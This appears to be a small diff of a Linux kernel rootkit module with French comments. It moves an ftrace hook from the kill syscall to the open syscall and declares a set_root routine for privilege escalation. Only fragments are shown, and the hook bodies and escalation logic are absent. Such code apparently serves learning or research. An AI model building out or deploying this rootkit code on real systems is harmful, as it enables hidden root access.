@@ -25,7 +25,7 @@ MODULE_VERSION("0.01");
 // Pointeur vers la f° open pour save ses fonction d'origine
 static asmlinkage long (*orig_open)(const struct pt_regs *);
 
-// f° hooké qui remplace le syscall kill
+// f° hooké qui remplace le syscall open
 asmlinkage int hook_open(const struct pt_regs *regs)
 {
     void set_root(void);
@@ -84,9 +84,9 @@ void set_root(void)
 
 // tableau de struct ftrace_hook pour def l'appel qu'on veut hook
 static struct ftrace_hook hooks[] = {
-    // ici on appel la f° __x64_sys_kill et on lui passe notre f° hook_kill
-    // &orig_kill est un pointeur vers la f° d'origine pour la réutiliser si le flag est pas 64
-    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
+    // ici on appel la f° __x64_sys_open et on lui passe notre f° hook_open
+    // &orig_open est un pointeur vers la f° d'origine pour la réutiliser si le flag est pas 64
+    HOOK("__x64_sys_open", hook_open, &orig_open),
 };
 
 static int __init rootkit_init(void)
